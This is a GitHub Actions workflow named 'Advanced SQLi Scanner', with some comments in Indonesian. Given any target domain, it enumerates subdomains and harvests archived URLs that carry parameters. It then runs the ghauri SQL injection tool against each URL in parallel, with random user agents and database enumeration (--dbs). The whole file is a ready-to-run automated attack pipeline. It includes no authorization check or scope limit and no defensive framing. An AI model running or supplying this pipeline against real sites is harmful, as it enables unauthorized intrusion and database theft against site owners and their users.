name: Advanced SQLi Scanner

on:
  workflow_dispatch:
    inputs:
      domain:
        description: 'Target Domain'
        required: true
        type: string

jobs:
  scan:
    runs-on: ubuntu-latest
    timeout-minutes: 120
    
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      
      # ================================================
      # SETUP GO + CACHE (subfinder, assetfinder, httpx, gau, waybackurls)
      # ================================================
      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.21'
          cache: true
      
      - name: Install Go tools
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/tomnomnom/assetfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/lc/gau/v2/cmd/gau@latest
          go install -v github.com/tomnomnom/waybackurls@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH
      
      # ================================================
      # SETUP PYTHON + CACHE GHAURI
      # ================================================
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Cache Ghauri repo
        id: cache-ghauri
        uses: actions/cache@v4
        with:
          path: ./ghauri
          key: ghauri-repo-${{ hashFiles('./ghauri/.git/refs/heads/main') }}
          restore-keys: |
            ghauri-repo-
      
      - name: Cache Python packages
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('./ghauri/requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-
      
      - name: Install/Update Ghauri
        run: |
          if [ -d "./ghauri/.git" ]; then
            cd ghauri && git pull
          else
            git clone https://github.com/r0oth3x49/ghauri.git
          fi
          cd ghauri
          pip install --upgrade -r requirements.txt
          python setup.py install
          echo "$HOME/.local/bin" >> $GITHUB_PATH
      
      # ================================================
      # EKSEKUSI SCANNER
      # ================================================
      - name: Create scanner script
        run: |
          cat > sqli-scanner.sh << 'EOF'
          #!/bin/bash
          
          DOMAIN=$1
          echo "[*] Target: $DOMAIN"
          
          # Phase 1: Subdomain discovery (pararel)
          echo "[*] Running subfinder & assetfinder..."
          subfinder -d $DOMAIN -silent > sub.tmp &
          assetfinder --subs-only $DOMAIN > asset.tmp &
          wait
          cat sub.tmp asset.tmp | sort -u > sub.txt
          rm sub.tmp asset.tmp
          
          # Phase 2: Filter aktif
          echo "[*] Filtering active subdomains..."
          httpx -l sub.txt -silent -o sub_aktif.txt
          
          # Phase 3: Kumpulkan URL
          echo "[*] Gathering URLs..."
          > urls_raw.txt
          while IFS= read -r sub; do
              gau $sub >> urls_raw.tmp &
              waybackurls $sub >> urls_raw.tmp &
          done < sub_aktif.txt
          wait
          sort -u urls_raw.tmp > urls_raw.txt
          rm urls_raw.tmp
          
          # Phase 4: Filter URL parameter
          echo "[*] Filtering URLs with parameters..."
          grep -E '\?.*=.*&?.*=' urls_raw.txt | grep -vE '\.(jpg|jpeg|png|gif|css|js|ico|svg|webp|bmp|tiff|mp4|mp3|pdf|doc|docx|xls|xlsx|zip|tar|gz|rar)$' | sort -u > urls_with_params.txt
          
          # Phase 5: Filter aktif lagi
          echo "[*] Filtering active URLs..."
          httpx -l urls_with_params.txt -silent -o urls_final.txt
          
          # Clean temporary
          rm -f sub.txt sub_aktif.txt urls_raw.txt urls_with_params.txt
          
          # Phase 6: Scan dengan ghauri
          echo "[*] Running ghauri detection..."
          > vulnerable_urls.txt
          > sqli_logs.tmp
          
          while IFS= read -r url; do
              (
                  output=$(ghauri -u "$url" --batch --level 3 --technique=BEST --time-sec=5 --random-agent --fresh-queries --confirm --threads=1 --dbs 2>&1)
                  echo "$output" >> sqli_logs.tmp
                  if echo "$output" | grep -qiE "vulnerable|parameter.*injectable|target.*seems.*injectable|got sql injection|injection seems"; then
                      echo "$url" >> vulnerable_urls.txt
                  fi
              ) &
          done < urls_final.txt
          wait
          
          echo "[*] Done. Vulnerable URLs found: $(wc -l < vulnerable_urls.txt)"
          EOF
          
          chmod +x sqli-scanner.sh
      
      - name: Run SQLi Scanner
        run: ./sqli-scanner.sh ${{ inputs.domain }}
      
      # ================================================
      # UPLOAD HASIL
      # ================================================
      - name: Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: sqli-results-${{ inputs.domain }}
          path: |
            vulnerable_urls.txt
            sqli_logs.tmp
          retention-days: 7
          if-no-files-found: warn
      
      - name: Display summary
        if: always()
        run: |
          echo "========================================="
          echo "SCAN COMPLETED FOR: ${{ inputs.domain }}"
          echo "========================================="
          if [ -f vulnerable_urls.txt ]; then
            echo "Vulnerable URLs found: $(cat vulnerable_urls.txt | wc -l)"
            echo "========================================="
          else
            echo "No vulnerable URLs detected"
          fi
